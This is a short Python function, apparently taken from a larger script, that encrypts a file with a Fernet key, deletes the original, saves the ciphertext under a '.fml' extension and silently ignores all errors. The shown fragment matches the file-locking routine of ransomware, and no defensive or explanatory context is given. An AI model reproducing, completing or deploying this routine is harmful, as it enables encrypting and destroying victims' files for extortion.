def sym_encrypt(file,sym_key):
    try:
        o = open(file,"rb")
        k = Fernet(sym_key)
        encrypted = k.encrypt(base64.b64encode(o.read()))
        o.close()
        os.remove(file)
        newfilepath = "{}.fml".format(file)
        f = open(newfilepath, "w+")
        f.write(encrypted.decode())
        f.close()
    except:
        pass
        
